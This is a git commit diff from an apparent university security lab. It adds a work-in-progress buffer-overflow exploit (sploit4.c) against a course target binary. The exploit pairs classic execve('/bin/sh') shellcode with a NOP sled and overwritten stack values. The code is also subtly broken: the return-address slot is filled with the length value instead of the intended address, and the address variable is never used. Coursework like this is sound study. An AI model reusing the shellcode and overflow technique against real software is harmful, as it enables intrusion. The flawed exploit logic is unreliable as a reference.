28d9cce31cc4c441309fe235a4ea85d04c13b869
Yuki Saito <mintyplanet@gmail.com>
2015-01-24 19:51:16 -0500

    sploit4 WIP. I need to figure out which order i/len is placed on the stack on the ECF machine.

--- lab1/sploits/shellcode-64.h
+++ lab1/sploits/shellcode-64.h
@@ -5,3 +5,17 @@ static char shellcode[] =
   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+#define NOP 0x90
+
+#define SET_VALUE(buffer, pos, value) memcpy(&buffer[(pos)], &(value), sizeof(value))
+
+/* for debugging */
+void print_exploit(char *buf, int len){
+	printf("Exploit String:\n");
+	printf("  i: hex char\n");
+ 	int i;
+ 	for(i = 0; i < 200; i++){
+		printf("%3d: %hhx\t%c\n", i, buf[i], buf[i]);
+	}	
+}
--- lab1/sploits/sploit4.c
+++ lab1/sploits/sploit4.c
@@ -6,12 +6,39 @@
 
 #define TARGET "../targets/target4"
 
+/*
+
+This is still WIP
+
+ We want the exploit string to look like this;
+ [shellcode...][NOP][NOP][NOP]...[NOP][NOP][value i][value len][NOP][NOP][NOP][retaddr]
+*/
 int main(void)
 {
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  char exploit[200];
+  bzero(exploit, 200);
+  
+  strcpy(exploit, shellcode);
+  memset(&exploit[45], NOP, 155);
+
+  int target_i = 0x01ffff01;
+  SET_VALUE(exploit, 168, target_i);
+
+  int target_len = 200;
+  SET_VALUE(exploit, 172, target_len);
+  
+
+  char* r = (char*)0x2021fe10;
+  SET_VALUE(exploit, 180, target_len);
+  
+  //print_exploit(exploit, 200);
+
+  args[0] = TARGET;
+  args[1] = exploit;
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
